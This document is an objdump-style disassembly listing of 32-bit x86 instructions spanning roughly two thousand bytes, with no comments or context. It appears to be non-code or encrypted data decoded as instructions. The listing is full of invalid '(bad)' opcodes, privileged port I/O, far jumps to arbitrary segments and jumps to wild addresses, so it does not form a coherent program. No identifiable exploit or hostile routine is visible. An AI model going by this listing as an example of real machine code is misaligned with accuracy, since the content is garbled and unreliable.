  4062eb:	lock xor ch,BYTE PTR [ebx+0x38]
  4062ef:	pusha  
  4062f0:	pop    esp
  4062f1:	enter  0x9c57,0xc9
  4062f5:	popf   
  4062f6:	test   al,0x53
  4062f8:	es pusha 
  4062fa:	sub    ebx,0x55f2c7d1
  406300:	loop   0x406358
  406302:	rol    DWORD PTR [edi+0x62],1
  406305:	and    cl,BYTE PTR [edi-0x472554f]
  40630b:	(bad)  
  40630c:	je     0x40634a
  40630e:	sub    eax,ecx
  406310:	and    ecx,DWORD PTR [ecx]
  406312:	push   edi
  406313:	rdpmc  
  406315:	xchg   esi,eax
  406316:	out    0xcd,al
  406318:	daa    
  406319:	cmp    eax,0xf78ff2b0
  40631e:	jmp    0xd8eac42b
  406323:	loop   0x4063a0
  406325:	push   esp
  406326:	(bad)  
  406327:	cmp    ebp,esi
  406329:	in     al,0x43
  40632b:	dec    ecx
  40632c:	popa   
  40632d:	adc    dh,BYTE PTR [eax+0x5ac830c9]
  406333:	out    0xf,eax
  406335:	mov    bl,0xf5
  406337:	sub    bh,BYTE PTR [ebp+0xf654a45]
  40633d:	sub    ecx,DWORD PTR [edx+ecx*1+0x79]
  406341:	iret   
  406342:	xor    ah,BYTE PTR [edi+0x7e1ae557]
  406348:	cmp    dl,ah
  40634a:	pop    eax
  40634b:	or     BYTE PTR [ecx+0x5e],0xa0
  40634f:	push   ds
  406350:	inc    ebp
  406351:	mov    ecx,0x8ecc1cb9
  406356:	test   BYTE PTR [edi-0x44],dl
  406359:	xchg   edi,eax
  40635a:	mov    esp,0xf3621382
  40635f:	(bad)  
  406360:	jnp    0x406376
  406362:	and    eax,eax
  406364:	xchg   esi,eax
  406365:	mov    ?,WORD PTR [esi+edi*8]
  406368:	mov    ebx,0x18c2bd61
  40636d:	pop    ebp
  40636e:	mov    ds:0x9c739bff,al
  406373:	cmc    
  406374:	ss xchg esi,eax
  406376:	or     dl,BYTE PTR [edx-0x647435b0]
  40637c:	or     edx,esp
  40637e:	fstp   QWORD PTR [edx]
  406380:	pop    edi
  406381:	test   DWORD PTR [ebx-0x26],eax
  406384:	das    
  406385:	inc    edi
  406386:	fnstenv [esi+0x64]
  406389:	imul   edi,DWORD PTR [edi+0x7b],0xffffffbb
  40638d:	inc    esp
  40638e:	inc    eax
  40638f:	xor    eax,edx
  406391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406392:	and    cl,BYTE PTR [ebp+0xe1dbaab]
  406398:	mov    dl,0xbb
  40639a:	jl     0x406353
  40639c:	mov    ch,0xe
  40639e:	out    dx,eax
  40639f:	imul   edx,ebx,0x7b5b2ee4
  4063a5:	mov    DWORD PTR [eax-0x48e9617f],0xbb79521b
  4063af:	enter  0x430e,0xe1
  4063b3:	punpcklbw mm3,mm6
  4063b6:	mov    ch,0xad
  4063b8:	sbb    al,0x9b
  4063ba:	xchg   BYTE PTR [esi+ebp*1+0x4],al
  4063be:	mov    dh,0xc8
  4063c0:	retf   
  4063c1:	push   ebx
  4063c2:	pop    ss
  4063c3:	lods   al,BYTE PTR ds:[esi]
  4063c4:	leave  
  4063c5:	mov    bh,BYTE PTR ds:0x7563e1dc
  4063cb:	and    eax,0x9fdaf7e7
  4063d0:	fidiv  WORD PTR [ecx-0x3e9fb270]
  4063d6:	(bad)  
  4063d7:	shl    DWORD PTR [eax-0x63562779],cl
  4063dd:	(bad)  
  4063de:	jae    0x406427
  4063e0:	in     al,dx
  4063e1:	imul   edi,esp,0xdb619a97
  4063e7:	jmp    0x2a9140d7
  4063ec:	jle    0x406456
  4063ee:	jne    0x40640f
  4063f0:	cmp    DWORD PTR [ecx-0x59b1541],ebx
  4063f6:	retf   
  4063f7:	and    BYTE PTR [ecx-0x562f43ee],al
  4063fd:	cmp    bl,ch
  4063ff:	mov    ds:0x79efa23a,eax
  406404:	jbe    0x4063bc
  406406:	cmp    dh,BYTE PTR [ebx]
  406408:	dec    ebp
  406409:	sahf   
  40640a:	popf   
  40640b:	pop    DWORD PTR [esi]
  40640d:	jb     0x4063f1
  40640f:	div    DWORD PTR [edi+edi*8-0x3c0bfb5a]
  406416:	fcmovbe st,st(4)
  406418:	mov    BYTE PTR [ecx+edx*2],bh
  40641b:	xchg   DWORD PTR [edi+0xb],esi
  40641e:	mov    edx,0x93a595d
  406423:	icebp  
  406424:	(bad)  
  406425:	mov    esp,0x9e704574
  40642a:	out    0xa8,al
  40642c:	test   BYTE PTR [ebx-0x53909bd8],al
  406432:	sub    eax,ecx
  406434:	mov    esi,0xa66bb8aa
  406439:	adc    BYTE PTR [eax-0x4ff10fa1],ch
  40643f:	inc    edi
  406440:	push   edx
  406441:	mov    ebp,0xc52a6cc3
  406446:	sub    edi,DWORD PTR [edx-0x59]
  406449:	es mov ebp,0xab81aa64
  40644f:	imul   esp,edx,0x8bff9dd1
  406455:	inc    esp
  406456:	jne    0x40649f
  406458:	stos   BYTE PTR es:[edi],al
  406459:	idiv   DWORD PTR [eax+0x30]
  40645c:	and    BYTE PTR [edx-0x607b2e10],ch
  406462:	repnz loop 0x406443
  406465:	xchg   ecx,eax
  406466:	push   eax
  406467:	in     eax,0x27
  406469:	sbb    BYTE PTR [ebx+ebp*4-0x47],dl
  40646d:	jno    0x4064ec
  40646f:	mov    al,ds:0x41ccea05
  406474:	in     eax,0x71
  406476:	and    esp,DWORD PTR [edx+eax*8-0x39d3d4fe]
  40647d:	in     eax,dx
  40647e:	dec    esi
  40647f:	add    DWORD PTR [ecx-0x2a],edx
  406482:	cmp    eax,0x10cd27ac
  406487:	xchg   ebx,eax
  406488:	and    dl,bh
  40648a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40648b:	gs and eax,0x88b6911f
  406491:	enter  0xd763,0x37
  406495:	outs   dx,DWORD PTR ds:[esi]
  406496:	ja     0x406464
  406498:	lods   eax,DWORD PTR ds:[esi]
  406499:	rcl    DWORD PTR [ebx+edi*8+0x1c],0xb0
  40649e:	or     al,0x92
  4064a0:	jmp    0x25906009
  4064a5:	mov    ds:0x78ec47fb,al
  4064aa:	imul   eax,DWORD PTR [ebx],0xffffff84
  4064ad:	xchg   BYTE PTR [ebx+0x7f906964],ch
  4064b3:	(bad)  
  4064b4:	pop    es
  4064b5:	ds jno 0x4064ad
  4064b8:	dec    esp
  4064b9:	cmc    
  4064ba:	sub    DWORD PTR [esp+ebp*8-0x71],0x60
  4064bf:	mov    esi,DWORD PTR [ebx+edi*1-0x3cadf20b]
  4064c6:	xchg   edx,eax
  4064c7:	sbb    al,0xe1
  4064c9:	lea    esi,[ebp+edi*1+0x4a339d40]
  4064d0:	xor    DWORD PTR [edx+0x55],edi
  4064d3:	sti    
  4064d4:	jmp    0xea12793c
  4064d9:	icebp  
  4064da:	xor    edi,DWORD PTR [ecx-0x53]
  4064dd:	fiadd  DWORD PTR [esi+0x19]
  4064e0:	out    0xf5,al
  4064e2:	adc    eax,DWORD PTR [eax+ecx*1-0x2b]
  4064e6:	mov    bl,0xa2
  4064e8:	mov    eax,0x596ffda9
  4064ed:	jnp    0x406534
  4064ef:	pop    esp
  4064f0:	mov    ecx,0x7e1ec48
  4064f5:	add    dh,ch
  4064f7:	pop    es
  4064f8:	(bad)  
  4064f9:	je     0x4064bd
  4064fb:	mov    eax,ds:0xf4d7fde1
  406500:	ror    DWORD PTR [eax+0x47d364d9],1
  406506:	(bad)  
  406508:	push   eax
  406509:	jmp    0xb3aa:0xbca1bf99
  406510:	cmp    BYTE PTR [eax-0xed3bf1c],dl
  406516:	call   0x3eb0dc48
  40651b:	add    BYTE PTR [esi],0x24
  40651e:	dec    edx
  40651f:	jne    0x406570
  406521:	mov    WORD PTR [ecx+eiz*1-0x41ff7536],fs
  406528:	adc    edi,edx
  40652a:	cld    
  40652b:	pop    ss
  40652c:	cs test eax,0x1dff1ac9
  406532:	or     BYTE PTR [ecx-0x4d],bh
  406535:	daa    
  406536:	bound  ebx,QWORD PTR [ebx]
  406538:	inc    ebx
  406539:	mov    cl,0xd9
  40653b:	xchg   edx,eax
  40653c:	jge    0x406598
  40653e:	mov    al,0x15
  406540:	cmp    ecx,DWORD PTR [ebx+0x3a0c3cc9]
  406546:	pop    edx
  406547:	pushf  
  406548:	inc    edi
  406549:	ficomp DWORD PTR [eax+0x56]
  40654c:	cmc    
  40654d:	pop    es
  40654e:	xchg   ecx,eax
  40654f:	or     esi,DWORD PTR [eax+0x53]
  406552:	cmp    DWORD PTR [edx-0x11],esi
  406555:	sar    BYTE PTR [edi],0x5d
  406558:	stos   DWORD PTR es:[edi],eax
  406559:	cmc    
  40655a:	pusha  
  40655b:	jb     0x406503
  40655d:	arpl   WORD PTR [ebx],bp
  40655f:	sti    
  406560:	mov    al,0x1f
  406562:	fistp  WORD PTR [ebx+0x628676b4]
  406568:	adc    ch,BYTE PTR [esi-0x4b]
  40656b:	push   eax
  40656c:	inc    eax
  40656d:	fs mov edi,cs
  406570:	out    0xe,eax
  406572:	mov    esi,0x98dfac41
  406577:	test   al,0x7e
  406579:	jb     0x406581
  40657b:	jno    0x40651b
  40657d:	scas   al,BYTE PTR es:[edi]
  40657e:	mov    DWORD PTR [edi-0x9],0x29f0d03e
  406585:	bnd ret 0x449b
  406589:	pusha  
  40658a:	and    eax,esp
  40658c:	add    eax,0x3844855b
  406591:	sub    cl,BYTE PTR [eax+0x61]
  406594:	dec    ebp
  406595:	retf   
  406596:	mov    cl,0x88
  406598:	xchg   esi,eax
  406599:	add    DWORD PTR [edx+0x25b5318a],edx
  40659f:	inc    ebp
  4065a0:	mov    WORD PTR [ecx-0x67],ds
  4065a3:	mov    al,ds:0xa2314ca6
  4065a8:	(bad)  
  4065a9:	cmp    esp,ecx
  4065ab:	imul   edx,DWORD PTR [edx],0xfffffff4
  4065ae:	popa   
  4065af:	pop    ecx
  4065b0:	imul   esp,DWORD PTR [eax-0x12fa6846],0xf2bd784
  4065ba:	jne    0x406608
  4065bc:	data16 adc dl,ah
  4065bf:	add    al,0x1f
  4065c1:	mov    eax,0x85a740e9
  4065c6:	cmc    
  4065c7:	inc    edi
  4065c8:	cmp    dh,BYTE PTR [ecx]
  4065ca:	inc    ebp
  4065cb:	clc    
  4065cc:	ret    
  4065cd:	mov    eax,DWORD PTR [edi]
  4065cf:	mov    ds:0xa27c4712,eax
  4065d4:	mov    eax,0x666ae22e
  4065d9:	xchg   ebx,eax
  4065da:	outs   dx,BYTE PTR ds:[esi]
  4065db:	aam    0x2c
  4065dd:	(bad)  
  4065de:	pop    ecx
  4065df:	adc    ch,BYTE PTR [ebp+0x2c2d8d56]
  4065e5:	leave  
  4065e6:	outs   dx,BYTE PTR ds:[esi]
  4065e7:	icebp  
  4065e8:	cwde   
  4065e9:	neg    BYTE PTR [eax+0x66]
  4065ec:	lea    edi,ds:0xd9bcdbd9
  4065f2:	inc    ebp
  4065f3:	jl     0x406622
  4065f5:	mov    esp,DWORD PTR ds:0x7387f46c
  4065fb:	jbe    0x4065fa
  4065fd:	shl    DWORD PTR [eax],1
  4065ff:	(bad)  
  406600:	fwait
  406601:	pop    eax
  406602:	(bad)  
  406603:	(bad)  
  406605:	mov    ecx,0xbe7af6ad
  40660a:	push   0x4470d6cd
  40660f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406610:	pop    ss
  406611:	sbb    esi,DWORD PTR [eax+edx*2+0x39]
  406615:	xchg   BYTE PTR [eax+esi*1+0x4d],dl
  406619:	cmp    DWORD PTR [edi+ebx*2-0x2c],edx
  40661d:	mov    cl,0x6e
  40661f:	sub    edi,DWORD PTR [edx+0x2b]
  406622:	imul   ebp,DWORD PTR [ebx+0x2fb4f6b4],0xffffff90
  406629:	mov    al,0x9
  40662b:	push   ecx
  40662c:	scas   eax,DWORD PTR es:[edi]
  40662d:	add    ch,cl
  40662f:	rcr    ecx,1
  406631:	int    0xf1
  406633:	test   DWORD PTR [ebx],esi
  406635:	mov    bh,0x20
  406637:	ret    
  406638:	into   
  406639:	jo     0x4065ce
  40663b:	sbb    eax,0x12704a7f
  406640:	enter  0x8a7f,0x25
  406644:	in     al,dx
  406645:	cmp    BYTE PTR [eax-0x776452b7],ch
  40664b:	mov    ah,0x70
  40664d:	cli    
  40664e:	add    eax,0xab040e7f
  406653:	push   ebp
  406654:	xchg   ebp,eax
  406655:	mov    bh,0x9c
  406657:	jl     0x40662a
  406659:	in     eax,0xdb
  40665b:	out    dx,eax
  40665c:	push   edx
  40665d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40665e:	icebp  
  40665f:	outs   dx,BYTE PTR ds:[esi]
  406660:	and    DWORD PTR [ecx-0x386a6205],ebx
  406666:	xchg   edx,eax
  406667:	(bad)  
  406668:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406669:	adc    al,0x27
  40666b:	push   cs
  40666c:	cdq    
  40666d:	dec    esi
  40666e:	scas   eax,DWORD PTR es:[edi]
  40666f:	jmp    0x81653856
  406674:	in     eax,0x48
  406676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406677:	add    esi,eax
  406679:	cld    
  40667a:	sbb    al,BYTE PTR [eax+0x629e9f04]
  406680:	mov    al,0x17
  406682:	sbb    eax,0x55015f76
  406687:	and    eax,0x6823b1fa
  40668c:	push   cs
  40668d:	rcl    BYTE PTR [ebx-0x5e],cl
  406690:	or     eax,esi
  406692:	aam    0x9
  406694:	fistp  WORD PTR [esi]
  406696:	fstp   QWORD PTR [ebp-0x7e]
  406699:	ja     0x40661c
  40669b:	push   ds
  40669c:	xchg   ebx,eax
  40669d:	repnz sbb ecx,ebx
  4066a0:	lods   eax,DWORD PTR ds:[esi]
  4066a1:	jb     0x406634
  4066a3:	jnp    0x4066de
  4066a5:	jmp    0x4066ff
  4066a7:	mov    eax,0x8dbf8819
  4066ac:	dec    esp
  4066ad:	div    cl
  4066af:	rcl    bl,1
  4066b1:	push   0x17deb246
  4066b6:	sub    al,0x20
  4066b8:	retf   0x2ed
  4066bb:	(bad)
  4066bf:	lods   eax,DWORD PTR ds:[esi]
  4066c0:	xor    ecx,DWORD PTR [esi-0x5f]
  4066c3:	pushf  
  4066c4:	jecxz  0x406719
  4066c6:	mov    eax,ds:0x4a77a5df
  4066cb:	mov    al,ds:0x13139565
  4066d0:	jno    0x4066a3
  4066d2:	sub    bh,bh
  4066d4:	sar    DWORD PTR [edx+0x44],0xd8
  4066d8:	mov    esi,0xb4394d86
  4066dd:	std    
  4066de:	xor    DWORD PTR [eax],ecx
  4066e0:	sub    ebp,DWORD PTR [edi+0x57]
  4066e3:	add    BYTE PTR [edi+0x4966f57a],bl
  4066e9:	jg     0x4066e3
  4066eb:	cli    
  4066ec:	fsubr  DWORD PTR [eax+0x3777e3c4]
  4066f2:	mov    ds,edi
  4066f4:	inc    ecx
  4066f5:	sub    DWORD PTR [eax+0x43f42b2d],esi
  4066fb:	xchg   BYTE PTR [esi],ch
  4066fd:	push   esp
  4066fe:	add    al,0xfe
  406700:	add    ecx,DWORD PTR [ebp+0x5983f3d8]
  406706:	jb     0x4066d9
  406708:	(bad)  
  406709:	in     al,dx
  40670a:	call   0x9f07:0xbbc4ba94
  406711:	lods   eax,DWORD PTR ds:[esi]
  406712:	xchg   edi,eax
  406713:	pop    edx
  406714:	test   DWORD PTR [edi+0x30],0x86edc0bc
  40671b:	inc    eax
  40671c:	ror    al,1
  40671e:	loopne 0x406725
  406720:	(bad)  
  406721:	in     al,0xa3
  406723:	jle    0x40677e
  406725:	or     esi,DWORD PTR [ebx-0x230eb326]
  40672b:	adc    al,0xf7
  40672d:	retf   
  40672e:	aam    0x7d
  406730:	and    DWORD PTR [ecx+0x63],esi
  406733:	imul   edx,DWORD PTR [ebp-0x4ba188f3],0x51
  40673a:	iret   
  40673b:	mov    ebp,DWORD PTR [ecx+0x2dba38ec]
  406741:	icebp  
  406742:	pop    eax
  406743:	xchg   ecx,eax
  406744:	dec    ebp
  406745:	xor    edi,DWORD PTR [edi-0x60bd6ea6]
  40674b:	mov    cl,0x54
  40674d:	xchg   ebp,eax
  40674e:	push   edx
  40674f:	dec    edi
  406750:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406751:	lea    esp,[ebx]
  406753:	xchg   ebx,eax
  406754:	in     eax,0x27
  406756:	repz iret 
  406758:	daa    
  406759:	call   FWORD PTR [eax]
  40675b:	or     eax,0x7a1a9da2
  406760:	aas    
  406761:	pop    es
  406762:	bound  edx,QWORD PTR [esi+0x22]
  406765:	xchg   edx,eax
  406766:	mov    ds:0xc903c55b,al
  40676b:	test   esi,esp
  40676d:	cmp    edi,ecx
  40676f:	inc    esi
  406770:	sbb    ecx,DWORD PTR [esi-0x78]
  406773:	popa   
  406774:	sbb    eax,0x1e2f15cf
  406779:	mov    ch,0x26
  40677b:	pop    es
  40677c:	cld    
  40677d:	adc    DWORD PTR [ebx+0x13],edi
  406780:	cli    
  406781:	call   0x4ee6b156
  406786:	lock dec ebx
  406788:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406789:	pop    ebx
  40678a:	call   0xe0cff397
  40678f:	je     0x40678e
  406791:	inc    edi
  406792:	ins    BYTE PTR es:[edi],dx
  406793:	popf   
  406794:	in     eax,dx
  406795:	shl    BYTE PTR [eax+0x4dca4f1b],1
  40679b:	mov    BYTE PTR [esi-0x33a29098],cl
  4067a1:	call   0x8e5e:0x52efd334
  4067a8:	scas   al,BYTE PTR es:[edi]
  4067a9:	pop    ecx
  4067aa:	addr16 dec edx
  4067ac:	pop    edi
  4067ad:	lea    esp,[ebx+0x3b16797f]
  4067b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067b4:	mov    bl,0xc
  4067b6:	rcr    DWORD PTR [eax-0x6a],cl
  4067b9:	int3   
  4067ba:	push   cs
  4067bb:	test   eax,0x92f560c1
  4067c0:	xor    eax,0xbce4afaf
  4067c5:	adc    BYTE PTR [esi],bh
  4067c7:	sbb    DWORD PTR [ecx-0x75c5a346],ebx
  4067cd:	fistp  DWORD PTR [edi]
  4067cf:	and    BYTE PTR [esi-0x2a95952e],cl
  4067d5:	cmp    ebx,DWORD PTR [ebp+0x28]
  4067d8:	mov    eax,ds:0x6a2538b3
  4067dd:	inc    esi
  4067de:	adc    BYTE PTR [ebx+0x4d],bh
  4067e1:	mov    eax,ds:0xfa112595
  4067e6:	mov    eax,0x88b5f78d
  4067eb:	ja     0x40680a
  4067ed:	sub    al,0x62
  4067ef:	mov    esp,0x1a82813c
  4067f4:	or     BYTE PTR [ebp+0x38271958],cl
  4067fa:	jae    0x4067c5
  4067fc:	shr    BYTE PTR [esi-0x39],cl
  4067ff:	and    BYTE PTR [esi+esi*2-0x6e],cl
  406803:	pushfw 
  406805:	and    BYTE PTR [ebp+0x6b],dh
  406808:	nop
  406809:	adc    dl,dh
  40680b:	xor    edi,DWORD PTR [ecx-0x1186f35e]
  406811:	sbb    eax,0xe352bd68
  406816:	sbb    dl,BYTE PTR [ecx+0x52360a5e]
  40681c:	mov    esi,0x9b0c7c48
  406821:	(bad)  
  406823:	in     al,dx
  406824:	xlat   BYTE PTR ds:[ebx]
  406825:	fsub   DWORD PTR [esp+eiz*8-0x64]
  406829:	out    0xcd,eax
  40682b:	lods   eax,DWORD PTR ds:[esi]
  40682c:	cs dec eax
  40682e:	add    DWORD PTR [ebx-0x3a44f38d],ecx
  406834:	sbb    al,0x5d
  406836:	(bad)  
  406838:	fs push ebx
  40683a:	aam    0x6c
  40683c:	inc    ebp
  40683d:	es (bad) 
  40683f:	call   FWORD PTR [eax+ecx*4+0x5e]
  406843:	fdivr  st(0),st
  406846:	stos   DWORD PTR es:[edi],eax
  406847:	fsubr  QWORD PTR [ecx-0x5b]
  40684a:	lea    eax,[ecx]
  40684c:	fisttp DWORD PTR [ebp+0x40]
  40684f:	test   cl,ch
  406851:	(bad)  
  406852:	mov    eax,0x69ed99be
  406857:	cwde   
  406858:	push   cs
  406859:	(bad)  
  40685a:	mov    dl,0x6a
  40685c:	ja     0x40685f
  40685e:	cs sbb esi,eax
  406861:	or     DWORD PTR [edx],ebp
  406863:	out    0x97,al
  406865:	in     eax,0xb3
  406867:	mov    ?,WORD PTR ds:0xf81bf66
  40686d:	jge    0x4068ce
  40686f:	xor    eax,0x7c84d096
  406874:	dec    ebp
  406875:	sbb    dh,dh
  406877:	stos   BYTE PTR es:[edi],al
  406878:	mov    DWORD PTR [ebx-0x7c4cb986],edi
  40687e:	pop    ecx
  40687f:	pop    esp
  406880:	enter  0x5bd6,0xad
  406884:	mov    dh,0xb2
  406886:	xor    ecx,DWORD PTR [ebx-0x631140df]
  40688c:	sbb    ecx,ebx
  40688e:	mov    ds:0xfe90ba46,eax
  406893:	and    BYTE PTR [ebx-0x37],dl
  406896:	jae    0x40682c
  406898:	inc    ebx
  406899:	bound  ebx,QWORD PTR [esi+0x4575baab]
  40689f:	sub    al,0x5a
  4068a1:	es push 0x1dd91439
  4068a7:	xor    DWORD PTR [eax-0x2650f62a],ebx
  4068ad:	mov    ch,0xfe
  4068af:	xlat   BYTE PTR ds:[ebx]
  4068b0:	sahf   
  4068b1:	or     ah,al
  4068b3:	add    eax,0xabc945fc
  4068b8:	mov    cl,0x10
  4068ba:	add    cl,BYTE PTR [edi-0x4da15e34]
  4068c0:	adc    DWORD PTR [edi+0x4c1c1714],ebx
  4068c6:	pusha  
  4068c7:	pop    edi
  4068c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068c9:	test   DWORD PTR [ecx-0x2fa13f1c],ecx
  4068cf:	mov    ds,WORD PTR [edi-0x1b11d32e]
  4068d5:	xor    esp,DWORD PTR [esi+eiz*2]
  4068d8:	pop    ss
  4068d9:	sbb    esi,ebp
  4068db:	mov    cs,WORD PTR [esi]
  4068dd:	fld    TBYTE PTR [eax+0x276e5ccd]
  4068e3:	mov    ah,0x13
  4068e5:	jb     0x40687b
  4068e7:	test   eax,0xedd83bb3
  4068ec:	in     al,dx
  4068ed:	rcr    BYTE PTR [esi+ebp*4+0x19],cl
  4068f1:	data16 stos BYTE PTR es:[edi],al
  4068f3:	call   FWORD PTR [eax-0x5e]
  4068f6:	imul   eax,DWORD PTR [ecx],0xffffff96
  4068f9:	add    eax,0x421d093f
  4068fe:	cmc    
  4068ff:	cmp    al,0xb4
  406901:	(bad)  
  406903:	(bad)  
  406904:	call   0xfa7d9aa2
  406909:	ss push ss
  40690b:	push   eax
  40690c:	test   BYTE PTR [eax-0x2fa5c57c],dh
  406912:	push   edi
  406913:	fldz   
  406915:	xor    ah,al
  406917:	repnz sub edx,DWORD PTR [ebx+0x317b2821]
  40691e:	mov    dh,0xad
  406920:	popa   
  406921:	ror    BYTE PTR [eax],0x2d
  406924:	push   edx
  406925:	cmp    DWORD PTR [eax-0x5b7bde37],ecx
  40692b:	test   al,0x33
  40692d:	mov    ah,0x4e
  40692f:	or     esp,esi
  406931:	cld    
  406932:	dec    ecx
  406933:	scas   al,BYTE PTR es:[di]
  406935:	pusha  
  406936:	sbb    eax,0xa843d559
  40693b:	mov    esi,0x83ba1db4
  406940:	xor    BYTE PTR [ecx+0x2b],dl
  406943:	mov    esp,0xd65d5bc5
  406948:	add    al,0xd5
  40694a:	sub    BYTE PTR [ebx],bh
  40694c:	xor    eax,0x87c1b6ec
  406951:	icebp  
  406952:	lahf   
  406953:	xor    al,0xb1
  406955:	jecxz  0x406970
  406957:	lods   eax,DWORD PTR ds:[esi]
  406958:	call   0xd1a7:0x4ec55213
  40695f:	outs   dx,BYTE PTR ds:[esi]
  406960:	pop    ecx
  406961:	in     eax,0x72
  406963:	stc    
  406964:	mov    cl,0x6c
  406966:	mov    cl,0x9d
  406968:	leave  
  406969:	dec    ebx
  40696a:	dec    edi
  40696b:	add    DWORD PTR [ebp-0x5bffb8ee],ecx
  406971:	mov    al,0x4f
  406973:	hlt    
  406974:	into   
  406975:	pop    ebp
  406976:	adc    ebx,DWORD PTR [eax]
  406978:	sbb    DWORD PTR [ebx-0x168d14b3],eax
  40697e:	add    bh,bl
  406980:	cmp    al,0xd6
  406982:	mov    dh,BYTE PTR [ebx]
  406984:	out    0x8d,al
  406986:	pop    esi
  406987:	inc    esp
  406988:	stos   BYTE PTR es:[edi],al
  406989:	push   esi
  40698a:	xor    BYTE PTR [edx+edx*1],cl
  40698d:	mov    bl,0xb2
  40698f:	call   0xd741e77a
  406994:	div    dl
  406996:	das    
  406997:	fpatan 
  406999:	sbb    BYTE PTR [edx],0xfa
  40699c:	mov    al,0xf7
  40699e:	loopne 0x4069a3
  4069a0:	add    ax,0x57b7
  4069a4:	mov    esp,0x18a703c4
  4069a9:	(bad)  
  4069aa:	cmp    esi,DWORD PTR [ecx+ecx*1+0x72d87342]
  4069b1:	das    
  4069b2:	jmp    0x4069a0
  4069b4:	out    dx,al
  4069b5:	dec    eax
  4069b6:	pop    esi
  4069b7:	push   esp
  4069b8:	xchg   bh,cl
  4069ba:	out    dx,eax
  4069bb:	(bad)  
  4069bc:	shl    BYTE PTR [edx+ecx*4+0x7732dc72],1
  4069c3:	pop    es
  4069c4:	adc    DWORD PTR [esi+0x9],0x22e558ff
  4069cb:	push   ebp
  4069cc:	dec    ebp
  4069cd:	jne    0x406a29
  4069cf:	mov    bh,0xd0
  4069d1:	jb     0x4069bf
  4069d3:	mov    dh,0x5e
  4069d5:	dec    esp
  4069d6:	sub    DWORD PTR [esi],eax
  4069d8:	in     al,0x84
  4069da:	mov    ecx,0x68dbbd3b
  4069df:	sbb    BYTE PTR [ebx],0x5c
  4069e2:	adc    edi,DWORD PTR [edi+0x2e]
  4069e5:	add    ch,BYTE PTR ds:0xc98c7ad1
  4069eb:	arpl   cx,di
  4069ed:	outs   dx,DWORD PTR ds:[esi]
  4069ee:	ror    cl,1
  4069f0:	dec    esi
  4069f1:	add    BYTE PTR [eax-0x21],dl
  4069f4:	pop    ebp
  4069f5:	nop
  4069f6:	lods   eax,DWORD PTR ds:[esi]
  4069f7:	mov    WORD PTR [ecx+edi*1+0x6c67900d],cs
  4069fe:	pop    ecx
  4069ff:	sub    dh,BYTE PTR [ecx+ebp*8]
  406a02:	sub    cl,BYTE PTR [edi-0x2ce7f507]
  406a08:	cmc    
  406a09:	cld    
  406a0a:	push   ebp
  406a0b:	fcmovbe st,st(0)
  406a0d:	mov    dh,0xa5
  406a0f:	cwde   
  406a10:	es gs in al,dx
  406a13:	pop    esp
  406a14:	stc    
  406a15:	ret    0x1cb2
  406a18:	or     al,0x5e
  406a1a:	adc    bh,ch
  406a1c:	inc    ebp
  406a1d:	or     esi,ebp
  406a1f:	add    al,0xda
  406a21:	fwait
  406a22:	push   ecx
  406a23:	mov    edx,0x98600934
  406a28:	das    
  406a29:	pop    ss
  406a2a:	inc    DWORD PTR [ebp+0x104e6a23]
  406a30:	jno    0x406a0e
  406a32:	daa    
  406a33:	in     eax,dx
  406a34:	dec    BYTE PTR [esi+0x2ecf9d25]
  406a3a:	popf   
  406a3b:	sbb    al,0xcf
  406a3d:	outs   dx,BYTE PTR ds:[esi]
  406a3e:	aas    
  406a3f:	cmp    eax,0x7db8b4cc
  406a44:	jnp    0x4069ca
  406a46:	jmp    0x4069f8
  406a48:	ins    DWORD PTR es:[edi],dx
  406a49:	sub    DWORD PTR [eax-0x4b5ffc3e],eax
  406a4f:	mov    DWORD PTR [ebp-0x62ce1c51],edi
  406a55:	adc    eax,0x19fa2aa6
  406a5a:	fmul   st,st(4)
  406a5c:	pop    eax
  406a5d:	retf   0xe261
  406a60:	mov    ah,0xcd
  406a62:	es out dx,al
  406a64:	pop    ebx
  406a65:	sbb    DWORD PTR [esi],ebx
  406a67:	call   DWORD PTR [ecx-0x5b]
  406a6a:	pop    edi
  406a6b:	xchg   DWORD PTR [ebx-0xb3eccd7],ebx
  406a71:	leave  
  406a72:	icebp  
  406a73:	inc    eax
  406a74:	mov    bl,0x7a
  406a76:	int    0xf1
  406a78:	mov    dl,0x94
  406a7a:	push   esp
  406a7b:	push   0xfffffff5
  406a7d:	xchg   BYTE PTR ds:0xc294f16d,dh
  406a83:	shl    BYTE PTR [eax-0x3d9ea20c],cl
  406a89:	popa   
  406a8a:	push   cs
  406a8b:	div    ebx
  406a8d:	pop    edi
  406a8e:	es pop es
  406a90:	aad    0x53
  406a92:	(bad)  
  406a93:	bound  ebx,QWORD PTR [esi+0x184dacbb]
  406a99:	call   DWORD PTR [ecx]
  406a9b:	inc    edx
  406a9c:	dec    ebx
  406a9d:	xor    bh,BYTE PTR [ebp-0x68]
  406aa0:	and    ebp,DWORD PTR [edi+0x552fc301]
  406aa6:	mov    dl,0x2f
  406aa8:	xor    eax,0xbdc5aacf
  406aad:	push   ds
  406aae:	das    
  406aaf:	(bad)  
  406ab0:	push   eax
  406ab1:	in     eax,dx
  406ab2:	xchg   BYTE PTR [esi+0x3ae4981c],cl
  406ab8:	sbb    al,0xfa
  406aba:	iret   
  406abb:	out    0x3f,al
  406abd:	jmp    0xa30e:0x1b3b1733
  406ac4:	xor    BYTE PTR [eax-0x28],bh
  406ac7:	idiv   BYTE PTR [eax-0x5a73d6ea]
  406acd:	add    DWORD PTR [edx-0x7d],0x5a
  406ad1:	and    al,0xea
  406ad3:	mov    bl,0x90
  406ad5:	mov    al,ds:0x3bc8591b
  406ada:	mov    eax,DWORD PTR [edx+ebp*8]
  406add:	inc    ebp
  406ade:	and    al,0xce
  406ae0:	es cmp edx,ebp
  406ae3:	xor    eax,0xa0d4e17b
  406ae8:	and    ebx,esi
  406aea:	ss popf 
  406aec:	add    DWORD PTR [ecx],edi
  406aee:	scas   eax,DWORD PTR es:[edi]
  406aef:	pop    ebx
  406af0:	adc    DWORD PTR [edi-0x16],edx
